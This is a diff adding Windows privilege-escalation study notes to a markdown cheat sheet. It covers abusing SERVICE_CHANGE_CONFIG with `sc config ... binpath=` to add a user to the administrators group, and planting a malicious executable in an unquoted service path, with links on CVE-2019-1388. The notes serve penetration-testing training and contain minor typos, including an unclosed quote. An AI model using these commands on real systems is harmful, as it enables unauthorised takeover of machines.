@@ -265,8 +265,43 @@ BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
 - Even More: https://systemweakness.com/windows-privilege-escalation-hijacking-dlls-c2f26168bf37
 
 ## Escalation Path: Service Permissions (Paths)
+**Escalations via Binary Paths**
+- Detection
+	- Powerup
+		- `. .\PowerUp.ps1`
+		- `Invoke-AllChecks`
+  - Manual
+  	- `accesschk64.exe -uwcv Everyone *`
+  	- After finding a service. Example: daclsvc
+  		- `accesschk64.exe -wuvc daclsvc`
+  		- See if we have `SERVICE_CHANGE_CONFIG` permission.
+- Exploitation
+  - Query the service
+  	- `sc qc daclsvc`
+  - We can see the binary path name. 
+  - Since we have SERVICE_CHANGE_CONFIG permission, lets change it.
+  - `sc config daclsvc binpath= "net localgroup administrators user /add`
+  - `sc start daclsvc`
+  - `net localgroup administrators`
+
+**Escalations via Unquoted Service Paths**
+- If you have a service executable which path is not enclosed quotations and contains a space, we can escalate a privileges (only if the vulnerable service is running with SYSTEM privilege level which most of the time it is).
+- Detection
+	- PowerUp
+		- `...\PowerUp.ps1`
+		- `Invoke-AllChecks`
+- Create a malicious exe file and deliver to windows.
+- Name the exe file as the same where the space if found on the service path and mv exe file.
+- Example, if the path is `C:\Program File\Unquoted Path\Common Path\testservice.exe`
+- We should name the malicious payload with Common.exe and move it under Coomon Path directory.
+- Start the service: `sc start unquotedsvc`
+- More Info: https://vk9-sec.com/privilege-escalation-unquoted-service-path-windows/
+- Even More on: https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae
 
 ## Escalation Path: CVE-2019-1388
+- More Info: https://justinsaechao23.medium.com/cve-2019-1388-windows-certificate-dialog-elevation-of-privilege-4d247df5b4d7
+- More Info: https://github.com/nobodyatall648/CVE-2019-1388
 
 ## References
 - https://infosecwriteups.com/privilege-escalation-in-windows-380bee3a2842
+- https://academy.tcm-sec.com/
